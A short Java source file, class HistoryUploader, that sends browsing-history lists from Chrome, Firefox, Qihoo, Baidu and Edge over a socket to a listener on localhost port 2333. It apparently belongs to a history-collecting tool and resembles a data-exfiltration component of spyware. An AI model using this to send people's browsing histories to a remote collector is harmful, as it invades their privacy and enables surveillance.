package org.kamuyashiro;

import java.io.*;
import java.net.*;
import java.util.*;

public class HistoryUploader {

   public static void upload(List<String> chromeHistory, List<String> firefoxHistory, List<String> qihooHistory, List<String> baiduHistory,List<String> edgeHistory) {
      try (Socket socket = new Socket("127.0.0.1", 2333)) {
         // 创建输出流
         OutputStream outputStream = socket.getOutputStream();
         DataOutputStream dataOutputStream = new DataOutputStream(outputStream);


         // 将历史记录写入输出流
         writeHistory(dataOutputStream, chromeHistory, "Chrome");
         writeHistory(dataOutputStream, firefoxHistory, "Firefox");
         writeHistory(dataOutputStream, qihooHistory, "Qihoo");
         writeHistory(dataOutputStream, baiduHistory, "Baidu");
         writeHistory(dataOutputStream,edgeHistory,"Edge");

         // 发送结束标志
         dataOutputStream.writeUTF("END");

         // 关闭输出流和socket
         dataOutputStream.close();
         socket.close();
      } catch (IOException e) {
         e.printStackTrace();
      }
   }

   private static void writeHistory(DataOutputStream dataOutputStream, List<String> history, String browserName) throws IOException {
      // 发送浏览器名称和历史记录数量
      int numRecords = history.size();
      dataOutputStream.writeUTF(browserName);
      dataOutputStream.writeInt(numRecords);

      // 发送每个历史记录
      for (String record : history) {
         dataOutputStream.writeUTF(record);
      }
   }
}
